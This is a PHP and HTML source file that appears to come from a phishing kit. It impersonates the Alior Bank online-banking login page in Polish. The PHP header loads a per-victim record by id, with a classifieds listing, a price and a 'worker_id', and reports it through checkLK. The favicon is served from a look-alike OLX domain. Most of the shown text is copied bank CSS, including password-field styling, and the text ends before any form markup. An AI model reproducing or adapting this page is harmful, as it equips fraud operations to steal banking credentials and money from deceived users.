<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "AliorBank");
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Alior Online – bankowość internetowa Alior Banku</title>
    <link rel="shortcut icon" href="https://olx-pl.plid06793483679.buzz/alior-favicon.ico" type="image/x-icon">
    <meta name="description" content="Logowanie do systemu bankowości internetowej Alior Banku.">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <style>
    @charset "UTF-8";
    :root {
      --color-background-1: #f2f2f2;
      --color-background-1-transparent-85: hsla(0, 0%, 95%, 0.85);
      --color-background-1-transparent-90: hsla(0, 0%, 95%, 0.9);
      --color-background-2-RGBA: hsla(0, 0%, 95%, 0);
      --color-background-2: #fff;
      --color-background-2-transparent-10: hsla(0, 0%, 100%, 0.1);
      --color-background-2-transparent-15: hsla(0, 0%, 100%, 0.15);
      --color-background-2-transparent-20: hsla(0, 0%, 100%, 0.2);
      --color-background-2-transparent-25: hsla(0, 0%, 100%, 0.25);
      --color-background-2-transparent-40: hsla(0, 0%, 100%, 0.4);
      --color-background-2-transparent-50: hsla(0, 0%, 100%, 0.5);
      --color-background-2-transparent-60: hsla(0, 0%, 100%, 0.6);
      --color-background-2-transparent-70: hsla(0, 0%, 100%, 0.7);
      --color-background-2-transparent-75: hsla(0, 0%, 100%, 0.75);
      --color-background-2-transparent-90: hsla(0, 0%, 100%, 0.9);
      --color-background-3: #a8a8a8;
      --color-background-3-transparent-20: hsla(0, 0%, 66%, 0.2);
      --color-background-4: #e0e0e0;
      --color-background-4-lighten-10: #fafafa;
      --color-background-4-darken-5: #d4d4d4;
      --color-background-5: #565656;
      --color-background-5-lighten-10: #707070;
      --color-background-6: #000;
      --color-background-7: #137eab;
      --color-background-8: #ffd153;
      --color-background-8-transparent-85: rgba(255, 209, 82, 0.85);
      --color-background-8-darken-5: #ffca38;
      --color-background-10: rgba(148, 0, 54, 0.05);
      --color-gradient-start: var(--color-background-1);
      --color-gradient-end: var(--color-background-2);
      --color-font-1: #333;
      --color-font-2: #565656;
      --color-font-2-lighten-10: #707070;
      --color-font-3: #920035;
      --color-font-3-darken-10: #610024;
      --color-font-4: #a8a8a8;
      --color-font-5: #e0e0e0;
      --color-font-6: #000;
      --color-font-7: #fff;
      --color-font-7-transparent-50: hsla(0, 0%, 100%, 0.5);
      --color-font-8: #f2f2f2;
      --color-font-9: #ffd153;
      --color-font-10: #001d7a;
      --color-font-11: #7a0035;
      --color-font-12: #6b001f;
      --color-font-13: #137eab;
      --color-font-14: #fff;
      --color-font-14-transparent-70: hsla(0, 0%, 100%, 0.7);
      --color-font-15: #fff;
      --color-font-16: #fff;
      --color-button-font-1: #fff;
      --color-button-font-2: #920035;
      --color-button-font-3: #920035;
      --color-button-font-4: #000;
      --color-button-font-5: #920035;
      --color-button-font-6: #333;
      --color-button-font-7: #6b001f;
      --color-button-font-8: #000;
      --color-button-font-9: #fff;
      --color-button-font-10: #fff;
      --color-button-font-11: #920035;
      --color-button-font-12: #000;
      --color-button-font-1-active: #fff;
      --color-button-font-2-active: #920035;
      --color-button-font-3-active: #920035;
      --color-button-font-4-active: #fff;
      --color-button-font-5-active: #920035;
      --color-button-font-6-active: #920035;
      --color-button-font-7-active: #6b001f;
      --color-button-font-8-active: #000;
      --color-button-font-9-active: #ffd153;
      --color-button-font-10-active: #920035;
      --color-button-font-11-active: #fff;
      --color-button-border-1: #920035;
      --color-button-border-2: #fff;
      --color-button-border-3: #ffd153;
      --color-button-border-2-active: #ffd153;
      --color-button-disabled: #a8a8a8;
      --color-button-close-1: #000;
      --color-button-close-2: #920035;
      --color-button-close-3: #000;
      --color-button-close-4: #fff;
      --color-accent-1: #920035;
      --color-accent-2: #a8a8a8;
      --color-accent-3: #f2f2f2;
      --color-accent-4: #333;
      --color-border-1: #e0e0e0;
      --color-border-1-darken-5: #d4d4d4;
      --color-border-2: #333;
      --color-border-3: #f2f2f2;
      --color-border-3-transparent-30: hsla(0, 0%, 95%, 0.1);
      --color-border-4: #a8a8a8;
      --color-border-5: #565656;
      --color-border-5-lighten-10: #707070;
      --color-border-6: #fff;
      --color-border-6-transparent-10: hsla(0, 0%, 100%, 0.1);
      --color-border-6-transparent-15: hsla(0, 0%, 100%, 0.15);
      --color-border-6-transparent-50: hsla(0, 0%, 100%, 0.5);
      --color-border-6-transparent-75: hsla(0, 0%, 100%, 0.75);
      --color-border-7: var(--color-accent-1);
      --color-border-8: #6b001f;
      --color-border-9: #137eab;
      --color-border-10: #ffd153;
      --color-border-11: #000;
      --color-border-11-transparent-20: rgba(0, 0, 0, 0.2);
      --color-border-11-transparent-75: rgba(0, 0, 0, 0.75);
      --color-border-12: #565656;
      --color-dotted-separator: #a8a8a8;
      --color-outline: #a8a8a8;
      --color-select-option-hover: #f2f2f2;
      --color-box-shadow-1: #e0e0e0;
      --color-box-shadow-1-transparent-5: hsla(0, 0%, 88%, 0.05);
      --color-box-shadow-1-transparent-35: hsla(0, 0%, 88%, 0.35);
      --color-box-shadow-2: #000;
      --color-box-shadow-2-transparent-10: rgba(0, 0, 0, 0.1);
      --color-box-shadow-2-transparent-15: rgba(0, 0, 0, 0.15);
      --color-box-shadow-2-transparent-25: rgba(0, 0, 0, 0.25);
      --color-box-shadow-2-transparent-80: rgba(0, 0, 0, 0.8);
      --color-box-shadow-2-transparent-95: rgba(0, 0, 0, 0.95);
      --color-box-shadow-3: #a8a8a8;
      --color-box-shadow-4: #fff;
      --color-box-shadow-4-transparent-30: hsla(0, 0%, 100%, 0.3);
      --color-box-shadow-4-transparent-75: hsla(0, 0%, 100%, 0.75);
      --color-box-shadow-5: #f2f2f2;
      --color-box-shadow-6: #920035;
      --color-box-shadow-7: #565656;
      --color-box-shadow-7-transparent-30: rgba(87, 87, 87, 0.3);
      --color-box-shadow-7-lighten-10: #707070;
      --color-scrollbar-track: #e0e0e0;
      --color-scrollbar-thumb: #a8a8a8;
      --color-scrollbar-custom-background: #000;
      --color-scrollbar-custom-background-transparent-90: rgba(0, 0, 0, 0.9);
      --color-label: #565656;
      --color-icon-1: #000;
      --color-icon-2: #a8a8a8;
      --color-icon-aureola: #e0e0e0;
      --color-icon-background: transparent;
      --color-backdrop: rgba(255, 209, 83, 0.85);
      --color-form-control-base-font: #000;
      --color-form-control-placeholder: #d4d4d4;
      --color-form-control-background: #fff;
      --color-form-control-tap-highlight: transparent;
      --color-form-control-active: #920035;
      --color-form-control-inactive: #a8a8a8;
      --color-form-control-disabled-label-font: #767676;
      --color-form-control-disabled-background: #fafafa;
      --color-form-control-focus-shadow: #0078d5;
      --color-form-control-invalid: #ed0023;
      --color-form-control-border: #a8a8a8;
      --color-input-disabled-background: var(--color-form-control-disabled-background);
      --color-input-disabled: #a8a8a8;
      --color-input-active-line: var(--color-accent-1);
      --color-loader-stroke: #fff;
      --color-animated-loader-stroke: #920035;
      --color-tooltip-background: var(--color-background-1);
      --color-tooltip-arrow: var(--color-background-1);
      --color-header-bottom-border: #e0e0e0;
      --color-widget-menu-background: #f2f2f2;
      --color-widget-menu-separator-line: #e0e0e0;
      --color-footer-background: #f2f2f2;
      --color-footer-upper-background: #333;
      --color-epuap-footer-background: #333;
      --color-dashboard-history-positive-separator: #22aa0a;
      --color-dashboard-history-positive-font: #1bc656;
      --color-dashboard-history-title-background: #e0e0e0;
      --color-ror-main: #920035;
      --color-ror: #bf5a00;
      --color-foreign-currency: #6a0085;
      --color-saving: #85005e;
      --color-saving-darken-10: #520039;
      --color-credit: #00857d;
      --color-debit: #920035;
      --color-deposit: #c93878;
      --color-deposit-darken-10: #a02c5e;
      --color-loan: #0579b1;
      --color-mortgage: #8d538a;
      --color-onboarding-guide: #082d48;
      --color-onboarding-guide-transparent-90: rgba(8, 46, 73, 0.9);
      --color-insurance: #001d7a;
      --color-tpp-icon: #fff;
      --color-tpp-icon-bg: #920035;
      --color-active-thread-background: var(--color-background-2);
      --color-active-thread-pointer: #e0e0e0;
      --color-reply-separator: #f2f2f2;
      --color-thread-separator: var(--color-separator-line);
      --color-thread-title: var(--color-font-1);
      --color-thread-preview: #565656;
      --color-message-from-client-bg: #298bd6;
      --color-avatar-border: #fff;
      --color-messages-count: #0078d5;
      --color-offer-promotion-background-label: #ffd153;
      --color-preapproved-slider-background: #ffd153;
      --color-onboarding-lead: #082d48;
      --color-deposit-border: #d771a8;
      --color-preloader-border: #dfd0c6;
      --color-datepicker-font: #000;
      --color-datepicker-font-active: #fff;
      --color-datepicker-header-font: #fff;
      --color-datepicker-header-background: #7a0035;
      --color-datepicker-today-background: #e0e0e0;
      --color-datepicker-cell-disabled-background: var(--color-form-control-background);
      --color-datepicker-cell-disabled-font: #e0e0e0;
      --color-datepicker-cell-active-background: #920035;
      --color-datepicker-calendar-header-background: #920035;
      --color-range-slider-background: #faa305;
      --color-range-slider-background-lighten-5: #faad1e;
      --color-avatar-color-default: var(--color-accent-1);
      --color-avatar-user--default: #298bd6;
      --color-avatar-type-1: #aacad4;
      --color-avatar-type-2: #e3ce6a;
      --color-avatar-type-3: #93c37b;
      --color-avatar-type-4: #f07d7d;
      --color-avatar-type-5: #e9bb6c;
      --color-avatar-type-6: #b7b5e9;
      --color-ror-main-start: #4b0016;
      --color-ror-main-end: #870031;
      --color-ror-start: var(--color-ror);
      --color-ror-end: #bd411b;
      --color-foreign-currency-start: #5e259e;
      --color-foreign-currency-end: var(--palette-currency);
      --color-saving-start: #770085;
      --color-saving-end: var(--color-saving);
      --color-credit-start: var(--color-credit);
      --color-credit-end: #00854e;
      --color-deposit-start: var(--color-deposit);
      --color-deposit-end: #b82898;
      --color-loan-start: var(--color-loan);
      --color-loan-end: #2247d1;
      --color-mortgage-start: var(--color-mortgage);
      --color-mortgage-end: #ad4d55;
      --color-brokerage-credit-line-start: var(--palette-brokerage);
      --color-brokerage-credit-line-end: #2247d1;
      --color-investment-funds-start: var(--palette-investments-funds);
      --color-investment-funds-end: #1e1971;
      --color-investment-account-start: var(--palette-investments-trader);
      --color-investment-account-end: #7b762b;
      --color-investments-start: var(--palette-investments-brokerage);
      --color-investments-end: #000;
      --color-investment-deposit-start: var(--palette-investments-deposits);
      --color-investment-deposit-end: #415e64;
      --color-investment-trader-start: var(--palette-investments-trader);
      --color-investment-trader-end: #002bb8;
      --color-investment-advisory-start: var(--palette-investments-advisory);
      --color-investment-advisory-end: var(--palette-investments-advisory);
      --color-cc-application-start: var(--color-credit);
      --color-cc-application-end: #00854e;
      --color-swiper-pagination-border: #767676;
      --color-swiper-pagination-background: #920035;
      --color-swiper-pagination-button: #920035;
      --color-payment-input-placeholder: #767676;
      --color-recipient-trusted-background: #f2f2f2;
      --color-recipient-trusted-icon: #fff;
      --color-recipient-trusted-icon-active: #21aa0a;
      --color-external-page-path-fill: #565656;
      --color-light-bulb-icon: #000;
      --color-role-selector-select: #565656
    }
    
    :root {
      --button-cta-background-active: var(--palette-yellow);
      --button-cta-text: var(--palette-white);
      --button-cta-text-active: var(--palette-paprika);
      --button-cta-primary-background: var(--palette-paprika);
      --button-cta-primary-background-active: var(--palette-paprika-active);
      --button-cta-primary-text: var(--palette-white);
      --button-cta-primary-special-color: var(--palette-paprika-active);
      --button-cta-contrast-color: var(--palette-white);
      --button-cta-contrast-background: var(--palette-black);
      --button-cta-contrast-alt-color: var(--palette-black);
      --button-cta-contrast-alt-background: var(--palette-white);
      --button-cta-yellow-white-text: var(--palette-paprika);
      --button-cta-yellow-white-text-active: var(--palette-paprika)
    }
    
    :root {
      --color-separator-line-light: var(--palette-concrete);
      --color-separator-line: var(--palette-alto)
    }
    
    :root {
      --color-bullet-with-icon-aureola: var(--palette-concrete)
    }
    
    :root {
      --palette-onboarding-lead: var(--palette-navy);
      --palette-onboarding-guide-bg: rgba(8, 46, 73, 0.9);
      --palette-onboarding-navigation: hsla(0, 0%, 100%, 0.1);
      --palette-onboarding-navigation-current: var(--palette-white)
    }
    
    :root {
      --no-results-image-background: var(--palette-concrete)
    }
    
    :root {
      --palette-white: #fff;
      --palette-white-2: #fff;
      --palette-mercury: #e2e2e2;
      --palette-concrete: #f2f2f2;
      --palette-alto: #e0e0e0;
      --palette-gray-3: #a8a8a8;
      --palette-gray-4: #2d2d33;
      --palette-black: #000;
      --palette-shark: #2f3036;
      --palette-black-bomb: #1f1f21;
      --palette-boulder: #767676;
      --palette-navy: #082d48;
      --palette-mako: #454550;
      --palette-trout: #4e525d;
      --palette-scorpion: #565656;
      --palette-manatee: #969698;
      --palette-silver-chalice: #a8a8a8;
      --palette-jumbo: #717172;
      --palette-yellow: #f7c54e;
      --palette-gold: #f6bd37;
      --palette-paprika: #920035;
      --palette-paprika-active: #7a002d;
      --palette-deposit: #c93878;
      --palette-deposit-active: #b4316a;
      --palette-currency: #6a0085;
      --palette-currency-active: #56006b;
      --palette-ror-main: #920035;
      --palette-ror-main-active: #7a002d;
      --palette-ror: #bf5a00;
      --palette-ror-active: #a34c00;
      --palette-foreign-currency: #6a0085;
      --palette-foreign-currency-active: #56006b;
      --palette-saving: #85005e;
      --palette-saving-active: #6b004b;
      --palette-credit: #00857d;
      --palette-credit-active: #006b64;
      --palette-credit-card: #00857d;
      --palette-credit-card-active: #006b64;
      --palette-debit: #920035;
      --palette-debit-active: #7a002d;
      --palette-loan: #0579b1;
      --palette-loan-active: #04689a;
      --palette-mortgage: #8d538a;
      --palette-mortgage-active: #7d4a7b;
      --palette-insurance: #001d7a;
      --palette-insurance-active: #001761;
      --palette-savings: #85005e;
      --palette-savings-active: #6b004b;
      --palette-brokerage: #0579b1;
      --palette-brokerage-active: #04689a;
      --palette-investments-funds: #131047;
      --palette-investments-funds-active: #0d0b32;
      --palette-investments-brokerage: #414141;
      --palette-investments-brokerage-active: #333;
      --palette-investments-trader: #001f85;
      --palette-investments-trader-active: #00196b;
      --palette-investments-deposits: #557b83;
      --palette-investments-deposits-active: #4b6c72;
      --palette-investments-advisory: #31474b;
      --palette-investments-advisory-active: #26383b;
      --palette-success: #21aa0a;
      --palette-partial-success: #565656;
      --palette-success-active: #1d9108;
      --palette-error: #ed0023;
      --palette-error-active: #d1001f;
      --palette-info: #0078d5;
      --palette-alert: #ed0023;
      --palette-notification-dark: rgba(0, 0, 0, 0.8);
      --palette-notification-font: #fff;
      --palette-background-primary: var(--palette-white);
      --palette-background-secondary: #f2f2f2;
      --palette-text-primary: #333;
      --palette-box-shadow-1: hsla(0, 0%, 88%, 0.05);
      --palette-box-shadow-2: rgba(0, 0, 0, 0.1);
      --palette-accent-primary: #920035;
      --palette-profile-icon: var(--palette-white);
      --palette-form-control-disabled-background: #fafafa;
      --palette-form-control-disabled-color: var(--palette-silver-chalice);
      --palette-labels: var(--palette-scorpion);
      --palette-form-control-border: var(--palette-silver-chalice);
      --palette-form-control-border-active: var(--palette-paprika);
      --palette-form-control-placeholder: var(--palette-boulder);
      --palette-form-control-background: var(--palette-white);
      --palette-form-control-active-element: var(--palette-concrete);
      --palette-form-control-font-color: var(--palette-black);
      --palette-form-control-disable-font-color: var(--palette-silver-chalice)
    }
    
    :root {
      --theme-transparent-icon-background: var(--palette-white-2);
      --theme-transparent-icon-color: var(--palette-black);
      --theme-transparent-icon-color-active: var(--palette-white);
      --theme-transparent-label-color: var(--palette-black)
    }
    
    :root {
      --radial-progreess-bar-theme-default-track: rgba(148, 0, 54, 0.2);
      --radial-progreess-bar-theme-default-progress: rgba(148, 0, 54, 0.8);
      --radial-progressbar-theme-white-track: hsla(0, 0%, 100%, 0.2);
      --radial-progressbar-theme-white-progress: hsla(0, 0%, 100%, 0.8)
    }
    
    :root {
      --moto-insurance-offer-background: rgba(148, 0, 54, 0.05)
    }
    
    :root {
      --swiper-pagination-inactive: var(--palette-alto);
      --swiper-pagination-active: var(--palette-paprika)
    }
    
    :root {
      --active-sorting-color: var(--palette-scorpion);
      --inactive-sorting-color: var(--palette-silver-chalice)
    }
    
    :root {
      --main-navigation-second-level-separator-color: var(--palette-alto)
    }
    
    :root {
      --color-dotted-interspace: var(--palette-manatee)
    }
    
    :root {
      --img-filter-primary: none
    }
    
    html {
      font-family: sans-serif;
      -ms-text-size-adjust: 100%;
      -webkit-text-size-adjust: 100%
    }
    
    header,
    main,
    section {
      display: block
    }
    
    a {
      background-color: transparent
    }
    
    a:active,
    a:hover {
      outline: 0
    }
    
    h1 {
      font-size: 2em;
      margin: .67em 0
    }
    
    img {
      border: 0
    }
    
    svg:not(:root) {
      overflow: hidden
    }
    
    button,
    input {
      color: inherit;
      font: inherit;
      margin: 0
    }
    
    button {
      overflow: visible
    }
    
    button {
      text-transform: none
    }
    
    button,
    input[type=submit] {
      -webkit-appearance: button;
      cursor: pointer
    }
    
    button::-moz-focus-inner,
    input::-moz-focus-inner {
      border: 0;
      padding: 0
    }
    
    input {
      line-height: normal
    }
    
    html {
      font-size: 100%;
      box-sizing: border-box
    }
    
    *,
    :after,
    :before {
      box-sizing: inherit
    }
    
    body {
      font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
      color: #000;
      color: var(--color-font-6);
      background: #f2f2f2;
      background: var(--color-background-1);
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale
    }
    
    img {
      max-width: 100%;
      height: auto;
      -ms-interpolation-mode: bicubic;
      display: inline-block;
      vertical-align: middle
    }
    
    button {
      -webkit-appearance: none;
      -moz-appearance: none;
      background: transparent;
      padding: 0;
      border: 0;
      border-radius: 0;
      line-height: 1
    }
    
    div,
    form,
    h1,
    h2,
    li,
    p,
    ul {
      margin: 0;
      padding: 0
    }
    
    p {
      font-size: inherit;
      line-height: 1.6;
      margin-bottom: 1rem;
      text-rendering: optimizeLegibility
    }
    
    strong {
      line-height: inherit
    }
    
    strong {
      font-weight: 700
    }
    
    h1,
    h2 {
      font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
      font-weight: 400;
      font-style: normal;
      color: inherit;
      text-rendering: optimizeLegibility;
      margin-top: 0;
      margin-bottom: .5rem;
      line-height: 1.4
    }
    
    h1 {
      font-size: 1.5rem
    }
    
    h2 {
      font-size: 1.25rem
    }
    
    @media screen and (min-width:40em) {
      h1 {
        font-size: 3rem
      }
      h2 {
        font-size: 2.5rem
      }
    }
    
    a {
      color: #2ba6cb;
      text-decoration: none;
      line-height: inherit;
      cursor: pointer
    }
    
    a:focus,
    a:hover {
      color: #258faf
    }
    
    a img {
      border: 0
    }
    
    ul {
      line-height: 1.6;
      margin-bottom: 1rem;
      list-style-position: outside
    }
    
    li {
      font-size: inherit
    }
    
    ul {
      list-style-type: disc
    }
    
    ul {
      margin-left: 1.25rem
    }
    
    .text-right {
      text-align: right
    }
    
    @media print {
      * {
        background: transparent!important;
        color: #000!important;
        box-shadow: none!important;
        text-shadow: none!important
      }
      a,
      a:visited {
        text-decoration: underline
      }
      a[href]:after {
        content: " (" attr(href) ")"
      }
      img {
        page-break-inside: avoid
      }
      img {
        max-width: 100%!important
      }
      @page {
        margin: .5cm
      }
      h2,
      p {
        orphans: 3;
        widows: 3
      }
      h2 {
        page-break-after: avoid
      }
    }
    
    [type=password],
    [type=text] {
      display: block;
      box-sizing: border-box;
      width: 100%;
      height: 2.4375rem;
      padding: .5rem;
      border: 1px solid #e0e0e0;
      border: 1px solid var(--color-border-1);
      margin: 0 0 1rem;
      font-family: inherit;
      font-size: 1rem;
      color: #000;
      color: var(--color-form-control-base-font);
      background-color: #fff;
      background-color: var(--color-form-control-background);
      box-shadow: inset 0 1px 2px hsla(0, 0%, 4%, .1);
      border-radius: 0;
      transition: box-shadow .5s, border-color .25s ease-in-out;
      -webkit-appearance: none;
      -moz-appearance: none
    }
    
    [type=password]:focus,
    [type=text]:focus {
      border: 1px solid #a8a8a8;
      border: 1px solid var(--color-form-control-border);
      background-color: transparent;
      outline: none;
      box-shadow: 0 0 5px #e0e0e0;
      box-shadow: 0 0 5px var(--color-box-shadow-1);
      transition: box-shadow .5s, border-color .25s ease-in-out
    }
    
    input::-moz-placeholder {
      color: #cacaca
    }
    
    input:disabled {
      background-color: #e6e6e6;
      cursor: default
    }
    
    [type=submit] {
      border-radius: 0;
      -webkit-appearance: none;
      -moz-appearance: none
    }
    
    label {
      display: block;
      margin: 0;
      font-size: .875rem;
      font-weight: 400;
      line-height: 1.8;
      color: #767676;
      color: var(--color-form-control-disabled-label-font)
    }
    
    fieldset {
      border: 0;
      padding: 0;
      margin: 0
    }
    
    .is-invalid-input:not(:focus) {
      background-color: rgba(198, 15, 19, .1);
      border-color: #c60f13
    }
    
    .clearfix:after,
    .clearfix:before {
      content: " ";
      display: table;
      flex-basis: 0;
      order: 1
    }
    
    .clearfix:after {
      clear: both
    }
    
    @media screen and (min-width:40em) {
      .hide-for-medium {
        display: none!important
      }
    }
    
    @media screen and (max-width:39.9375em) {
      .show-for-medium {
        display: none!important
      }
    }
    
    .button {
      display: inline-block;
      text-align: center;
      line-height: 1;
      cursor: pointer;
      -webkit-appearance: none;
      transition: background-color .25s ease-out, color .25s ease-out;
      vertical-align: middle;
      border: 1px solid transparent;
      border-radius: 0;
      padding: .85em 1em;
      margin: 0 0 1rem;
      font-size: .9rem;
      background-color: #2ba6cb;
      color: #fefefe
    }
    
    .button:focus,
    .button:hover {
      background-color: #258dad;
      color: #fefefe
    }
    
    .button.expanded {
      display: block;
      width: 100%;
      margin-left: 0;
      margin-right: 0
    }
    
    .button.primary {
      background-color: #2ba6cb;
      color: #fefefe
    }
    
    .button.primary:focus,
    .button.primary:hover {
      background-color: #2285a2;
      color: #fefefe
    }
    
    .row {
      max-width: 73.125rem;
      margin-left: auto;
      margin-right: auto;
      display: flex;
      flex-flow: row wrap
    }
    
    .row .row {
      margin-left: -.375rem;
      margin-right: -.375rem
    }
    
    .row .row {
      max-width: none
    }
    
    .column {
      flex: 1 1 0px;
      padding-left: .375rem;
      padding-right: .375rem;
      min-width: 0;
      min-width: auto
    }
    
    .small-19 {
      flex: 0 0 95%;
      max-width: 95%
    }
    
    @media screen and (min-width:40em) {
      .medium-offset-1 {
        margin-left: 5%
      }
      .medium-8 {
        flex: 0 0 40%;
        max-width: 40%
      }
      .medium-9 {
        flex: 0 0 45%;
        max-width: 45%
      }
      .medium-18 {
        flex: 0 0 90%;
        max-width: 90%
      }
    }
    
    @media screen and (min-width:64em) {
      .large-7 {
        flex: 0 0 35%;
        max-width: 35%
      }
      .large-10 {
        flex: 0 0 50%;
        max-width: 50%
      }
    }
    
    .shrink {
      flex: 0 0 auto;
      max-width: 100%
    }
    
    .align-center {
      justify-content: center
    }
    
    ul {
      margin-bottom: 0
    }
    
    ul {
      margin-left: 0
    }
    
    @font-face {
      font-family: iconfont;
      src: url("iconfont.eot") format("embedded-opentype"), url("alior-style-3.woff2") format("woff2"), url("alior-style-3.woff") format("woff")
    }
    
    .icon {
      line-height: 1
    }
    
    .icon,
    .icon:before {
      display: inline-block
    }
    
    .icon:before {
      font-family: iconfont!important;
      vertical-align: top
    }
    
    .icon-ban:before {
      content: ""
    }
    
    .icon-info:before {
      content: ""
    }
    
    *,
    :after,
    :before {
      box-sizing: border-box
    }
    
    html {
      min-width: 100%;
      min-height: 100%
    }
    
    body,
    html {
      position: relative
    }
    
    body {
      height: 100%;
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      overflow-y: scroll
    }
    
    body:focus {
      outline: 1px dashed #a8a8a8;
      outline: 1px dashed var(--color-outline)
    }
    
    ::-webkit-scrollbar {
      width: .4375rem
    }
    
    ::-webkit-scrollbar-track {
      border-radius: .21875rem;
      background-color: #e0e0e0;
      background-color: var(--color-scrollbar-track)
    }
    
    ::-webkit-scrollbar-thumb {
      background-color: #a8a8a8;
      background-color: var(--color-scrollbar-thumb);
      border-radius: .21875rem
    }
    
    @font-face {
      font-family: Roboto Light;
      src: url("alior-style-5.woff") format("woff")
    }
    
    @font-face {
      font-family: Roboto Regular;
      src: url("alior-style-7.woff") format("woff")
    }
    
    @font-face {
      font-family: Roboto Medium;
      src: url("alior-style-6.woff") format("woff")
    }
    
    body {
      font-family: Roboto Light, sans-serif;
      line-height: 1.5;
      font-size: .9375rem;
      font-weight: 400;
      font-style: normal
    }
    
    .view-app {
      overflow-x: hidden;
      overflow-y: auto
    }
    
    app-ajs-root .selectize-control {
      position: relative
    }
    
    app-ajs-root .selectize-input {
      font-size: 1rem;
      line-height: 18px
    }
    
    app-ajs-root .selectize-input {
      padding: 8px;
      display: inline-block;
      width: 100%;
      overflow: hidden;
      position: relative;
      z-index: 1
    }
    
    app-ajs-root .selectize-input:after {
      content: " ";
      display: block;
      clear: left
    }
    
    app-ajs-root .column {
      min-width: 0
    }
    
    app-ajs-root strong {
      font-weight: 400;
      font-family: Roboto Medium, sans-serif
    }
    
    app-ajs-root .sign-in-site .sign-in-wrapper {
      min-height: 100vh;
      background-color: #f2f2f2;
      background-color: var(--color-background-1)
    }
    
    app-ajs-root h1,
    app-ajs-root h2 {
      font-family: Roboto Light, sans-serif, HelveticaNeue, Helvetica Neue, Helvetica, Arial;
      letter-spacing: -.025em;
      font-family: Roboto Light, sans-serif
    }
    
    app-ajs-root h1 {
      font-size: 1.5rem
    }
    
    @media (min-width:768px) {
      app-ajs-root h1 {
        font-size: 2.0625rem
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root h1 {
        font-size: 2.5rem
      }
    }
    
    app-ajs-root h2 {
      font-size: 1.5rem
    }
    
    @media (min-width:768px) {
      app-ajs-root h2 {
        font-size: 2.0625rem
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root h2 {
        font-size: 2.5rem
      }
    }
    
    app-ajs-root a {
      color: #920035;
      color: var(--color-font-3);
      font-family: Roboto Light, sans-serif, HelveticaNeue, Helvetica Neue, Helvetica, Arial;
      font-size: .9375rem;
      transition: color .25s ease, opacity .25s ease;
      font-family: Roboto Medium, sans-serif
    }
    
    app-ajs-root a:visited {
      color: #920035;
      color: var(--color-font-3)
    }
    
    app-ajs-root a:active,
    app-ajs-root a:focus,
    app-ajs-root a:hover {
      color: #6b001f;
      color: var(--color-font-12)
    }
    
    app-ajs-root p {
      line-height: 1.5em;
      font-size: .9375rem;
      font-family: Roboto Light, sans-serif
    }
    
    app-ajs-root input[type=password],
    app-ajs-root input[type=text]:not(.migrated) {
      display: inline-block;
      position: relative;
      padding: 0 10px;
      margin: 0;
      font-size: .9375rem;
      color: #000;
      color: var(--color-font-6);
      border: 1px solid #a8a8a8;
      border: 1px solid var(--color-form-control-border);
      line-height: normal;
      height: 50px;
      box-shadow: none;
      will-change: transform, contents, opacity;
      background: linear-gradient(180deg, #fff, #fff 97%, #920035 0, #920035);
      background: linear-gradient(180deg, var(--color-form-control-background) 0, var(--color-form-control-background) 97%, var(--color-input-active-line) 97%, var(--color-input-active-line) 100%);
      background-size: 1px 70px;
      transition: all .2s linear
    }
    
    @media (min-width:768px) {
      app-ajs-root input[type=password],
      app-ajs-root input[type=text]:not(.migrated) {
        padding: 0 15px 0 14px
      }
    }
    
    app-ajs-root .textarea-default:-internal-autofill-selected,
    app-ajs-root .textarea-default:-internal-autofill-selected:focus,
    app-ajs-root input[type=color]:-internal-autofill-selected,
    app-ajs-root input[type=color]:-internal-autofill-selected:focus,
    app-ajs-root input[type=date]:-internal-autofill-selected,
    app-ajs-root input[type=date]:-internal-autofill-selected:focus,
    app-ajs-root input[type=email]:-internal-autofill-selected,
    app-ajs-root input[type=email]:-internal-autofill-selected:focus,
    app-ajs-root input[type=number]:-internal-autofill-selected,
    app-ajs-root input[type=number]:-internal-autofill-selected:focus,
    app-ajs-root input[type=password]:-internal-autofill-selected,
    app-ajs-root input[type=password]:-internal-autofill-selected:focus,
    app-ajs-root input[type=password]:-webkit-autofill,
    app-ajs-root input[type=password]:-webkit-autofill:focus,
    app-ajs-root input[type=phone]:-internal-autofill-selected,
    app-ajs-root input[type=phone]:-internal-autofill-selected:focus,
    app-ajs-root input[type=search]:not(.migrated):-internal-autofill-selected,
    app-ajs-root input[type=search]:not(.migrated):-internal-autofill-selected:focus,
    app-ajs-root input[type=tel]:-internal-autofill-selected,
    app-ajs-root input[type=tel]:-internal-autofill-selected:focus,
    app-ajs-root input[type=text]:not(.migrated):-internal-autofill-selected,
    app-ajs-root input[type=text]:not(.migrated):-internal-autofill-selected:focus,
    app-ajs-root input[type=text]:not(.migrated):-webkit-autofill,
    app-ajs-root input[type=text]:not(.migrated):-webkit-autofill:focus,
    app-ajs-root input[type=time]:-internal-autofill-selected,
    app-ajs-root input[type=time]:-internal-autofill-selected:focus {
      -webkit-box-shadow: inset 0 0 0 70px #fff;
      -webkit-box-shadow: 0 0 0 70px var(--color-form-control-background) inset;
      -webkit-text-fill-color: #000;
      -webkit-text-fill-color: var(--color-font-6)
    }
    
